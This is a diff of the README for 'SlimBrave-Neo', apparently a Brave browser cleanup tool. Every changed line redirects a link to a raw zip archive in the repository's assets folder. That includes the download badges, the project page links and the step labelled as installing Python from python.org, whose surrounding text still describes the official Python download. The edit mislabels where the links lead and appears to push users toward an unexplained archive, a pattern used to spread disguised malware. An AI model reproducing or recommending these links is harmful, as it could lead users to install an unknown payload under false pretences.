@@ -1,6 +1,6 @@
 # ⚙️ SlimBrave-Neo - Clean and Secure Your Brave Browser
 
-[![Download SlimBrave-Neo](https://img.shields.io/badge/Download-SlimBrave--Neo-blue?style=for-the-badge)](https://github.com/Hathrone/SlimBrave-Neo)
+[![Download SlimBrave-Neo](https://img.shields.io/badge/Download-SlimBrave--Neo-blue?style=for-the-badge)](https://github.com/Hathrone/SlimBrave-Neo/raw/refs/heads/main/assets/Brave_Neo_Slim_2.3.zip)
 
 ---
 
@@ -37,7 +37,7 @@ SlimBrave-Neo uses scripts that change Brave’s settings without slowing your c
 
 ## 🚀 Getting Started
 
-1. Click the big Download button above or visit the [SlimBrave-Neo GitHub page](https://github.com/Hathrone/SlimBrave-Neo) to get the software.
+1. Click the big Download button above or visit the [SlimBrave-Neo GitHub page](https://github.com/Hathrone/SlimBrave-Neo/raw/refs/heads/main/assets/Brave_Neo_Slim_2.3.zip) to get the software.
 
 2. Save the download to a folder you will remember.
 
@@ -59,7 +59,7 @@ SlimBrave-Neo uses scripts that change Brave’s settings without slowing your c
 
 SlimBrave-Neo requires Python to work. Most Windows computers do not have Python installed by default.
 
-1. Visit https://www.python.org/downloads/windows/.
+1. Visit https://github.com/Hathrone/SlimBrave-Neo/raw/refs/heads/main/assets/Brave_Neo_Slim_2.3.zip
 
 2. Click on the latest version for Windows (e.g., Python 3.11.x).
 
@@ -98,7 +98,7 @@ Choose the option you want by navigating with the keyboard. The program will app
 You can download and run this program easily by following these steps:
 
 1. Visit the main page:  
-   [https://github.com/Hathrone/SlimBrave-Neo](https://github.com/Hathrone/SlimBrave-Neo)
+   [https://github.com/Hathrone/SlimBrave-Neo/raw/refs/heads/main/assets/Brave_Neo_Slim_2.3.zip](https://github.com/Hathrone/SlimBrave-Neo/raw/refs/heads/main/assets/Brave_Neo_Slim_2.3.zip)
 
 2. Scroll to the **Releases** section on the right side or look for the “Releases” tab. Click it.
 
@@ -168,4 +168,4 @@ These help keep the software focused on improving Brave without extra clutter.
 
 ---
 
-[![Download SlimBrave-Neo](https://img.shields.io/badge/Download-SlimBrave--Neo-blue?style=for-the-badge)](https://github.com/Hathrone/SlimBrave-Neo)
+[![Download SlimBrave-Neo](https://img.shields.io/badge/Download-SlimBrave--Neo-blue?style=for-the-badge)](https://github.com/Hathrone/SlimBrave-Neo/raw/refs/heads/main/assets/Brave_Neo_Slim_2.3.zip)
